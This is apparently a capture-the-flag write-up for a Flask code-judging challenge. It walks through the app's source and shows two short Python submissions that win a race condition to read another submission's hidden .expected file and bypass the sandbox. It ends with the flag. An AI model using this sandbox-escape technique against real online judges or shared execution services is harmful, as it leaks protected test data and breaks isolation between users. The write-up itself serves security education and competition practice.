# Hello
## Description
> I made a new website to compete against my friends to see who could write faster code. Unfortunately, I don't actually know how to write that much code. Don't tell them, but ChatGPT wrote this entire website for me. Can you solve the problems for me?

## Code Analysis and Database Schema
The application consists of three main files:

- ```app.py```: The main Flask application handling submissions and evaluation.
- ```db.py```: Handles the database connections and inserts the flag into the database.
- ```sandbox.py```: Contains the sandboxing code that limits the actions a submission can perform.

From ```db.py```, we observe that the flag is stored as the output for a hidden test case associated with the problem helloinput:

```python
with Session(engine) as db:
    flag = os.environ.get("FLAG")
    if flag:
        flag_case = db.scalar(select(ProblemTestCase).filter_by(problem_id="helloinput", hidden=True))
        flag_case.output = flag + "\n"
        db.commit()
```
Our target is to retrieve the output of the hidden test case for helloinput, which contains the flag.

## Understanding the Submission Handling Process
The application first retrieves a record from the Problem table using the problem_id parameter:

```python
app = Flask(__name__)
[...]
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        # Select problem
        problem = db.scalar(select(Problem).filter_by(id=problem_id))
        if not problem:
            abort(404)
        if request.method == 'GET':
            return render_template('submit.html', problem=problem)
        [...]
```
Next, it retrieves a record from the ProblemTestCase table that matches the given problem_id and checks if the submitted code's length is within the allowed limit:

```python
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        # Get testcases, code, sandbox
        testcases = db.scalars(select(ProblemTestCase).filter_by(problem_id=problem_id)).all()
        code = request.form['code']
        if len(code) > 32768:
            return abort(400)
        [...]
```
The application then inserts a new record into the Submission table with the provided problem_id, user_id, submitted code, and status. It also copies the sandbox.py file to /tmp/sandbox.py and writes a new Python script at /tmp/<submission_id>.py. This new script imports the Sandbox class from sandbox.py and appends the user's submitted code:

```python
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        # Create submission
        submission = Submission(problem_id=problem_id, user_id=session['user_id'], code=code, status='Pending')
        db.add(submission)
        db.commit()
        submission_id = submission.id

        # Prepare code
        shutil.copy('sandbox.py', f'/tmp/sandbox.py')
        with open(f'/tmp/{submission_id}.py', 'w') as f:
            f.write(f'__import__("sandbox").Sandbox("{submission_id}")\n' + code.replace('\r\n', '\n'))
        [...]
```
Once everything is prepared, the application iterates over all problem test cases and writes the test case input and output to files at /tmp/<submission_id>.in and /tmp/<submission_id>.expected:

```python
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        # Run testcases
        skip_remaining_cases = False
        for testcase in testcases:
            # Set testcase status
            submission_case = SubmissionOutput(submission_id=submission_id, testcase_id=testcase.id, status='Pending')
            db.add(submission_case)
            if skip_remaining_cases:
                submission_case.status = 'Skipped'
                db.commit()
                continue

            if not testcase.hidden:
                submission_case.expected_output = testcase.output
            # Set up input and output files
            with open(f'/tmp/{submission_id}.in', 'w') as f:
                f.write(testcase.input.replace('\r\n', '\n'))
            with open(f'/tmp/{submission_id}.expected', 'w') as f:
                f.write(testcase.output.replace('\r\n', '\n'))
            [...]
```
For the hidden test case in the "Hello, Input!" problem, the output contains the flag, but since it's hidden, the expected_output is empty, preventing direct flag access. The frontend template renders "(Output Hidden)" when the expected_output is empty:

```html
[...]
{% for row in testcases %}
<tr>
    <td>{{ row.testcase_id }}</td>
    <td>{% if row.expected_output %}<pre>{{ row.expected_output }}</pre>{% else %}(Output Hidden){% endif %}</td>
    <td>{% if row.expected_output %}<pre>{{ row.actual_output }}</pre>{% else %}(Output Hidden){% endif %}</td>
    <td>{{ row.status }}</td>
</tr>
{% endfor %}
[...]
```
During the test case execution, the application uses the subprocess.run function to execute the sandboxed Python code with a timeout of 1 second. The code's output is captured and compared to the expected output using the diff command:

```python
import subprocess
[...]
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        for testcase in testcases:
            # Run code
            try:
                proc = subprocess.run(f'sudo -u nobody -g nogroup python3 /tmp/{submission_id}.py < /tmp/{submission_id}.in > /tmp/{submission_id}.out', shell=True, timeout=1)
                if proc.returncode != 0:
                    submission.status = 'Runtime Error'
                    skip_remaining_cases = True
                    submission_case.status = 'Runtime Error'
                else:
                    diff = subprocess.run(f'diff /tmp/{submission_id}.out /tmp/{submission_id}.expected', shell=True, capture_output=True)
                    if diff.stdout:
                        submission.status = 'Wrong Answer'
                        skip_remaining_cases = True
                        submission_case.status = 'Wrong Answer'
                    else:
                        submission_case.status = 'Accepted'
            except subprocess.TimeoutExpired:
                submission.status = 'Time Limit Exceeded'
                skip_remaining_cases = True
                submission_case.status = 'Time Limit Exceeded'
        [...]
```
If the output is incorrect, the remaining test cases are skipped.

After comparing outputs, the application inserts the result into the SubmissionOutput table, saves the actual output, and deletes the test case input, output, and the user's submitted code files:

```python
def __cleanup_test_case(submission_id):
    os.remove(f'/tmp/{submission_id}.in')
    os.remove(f'/tmp/{submission_id}.out')
    os.remove(f'/tmp/{submission_id}.expected')
[...]
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        for testcase in testcases:
            [...]
            # Cleanup
            with open(f'/tmp/{submission_id}.out', 'r') as f:
                submission_case.actual_output = f.read(1024)
            db.commit()
            __cleanup_test_case(submission_id)
    # Set overall status
    if submission.status == 'Pending':
        submission.status = 'Accepted'
        db.commit()
    os.remove(f'/tmp/{submission_id}.py')
    return redirect(f'/submission/{submission_id}')
```
## Sandbox Bypassing via Race Condition
The sandboxing code in ```sandbox.py``` restricts operations such as opening files in write mode and reading the .expected file associated with the current submission ID. However, the ```.expected``` file is temporarily created during the submission process, providing a window of opportunity to read it before it gets deleted.

```python
def _safe_open(open, submission_id):
    def safe_open(file, mode="r"):
        if mode != "r":
            raise RuntimeError("Nein")
        file = str(file)
        if file.endswith(submission_id + ".expected"):
            raise RuntimeError("Nein")
        return open(file, "r")

    return safe_open
```
## Exploiting the Race Condition
To exploit this, we can use a race condition between two submissions:

Submission A: A dummy submission that prints the expected output for the first test case and enters an infinite loop for the second test case. This delay prevents the ```.expected``` file from being deleted immediately.

### Code for Submission A:

```python
if input() == "Welcome to Crator":
    print("Welcome to Crator")
else:
    while True:
        pass
```
Submission B: A submission that repeatedly attempts to read the ```.expected``` file created by Submission A.

### Code for Submission B:

```python
print(open("/tmp/1.expected").read())
```
## Execution Flow
- Start Submission A, which will hang during the second test case, keeping the ```/tmp/<submission_id>.expected``` file intact.
- While Submission A is still running, submit Submission B, which tries to read the ```.expected``` file created by Submission A.

## Flag
```idek{1m4g1n3_n0t_h4v1ng_pr0p3r_s4ndb0x1ng}```
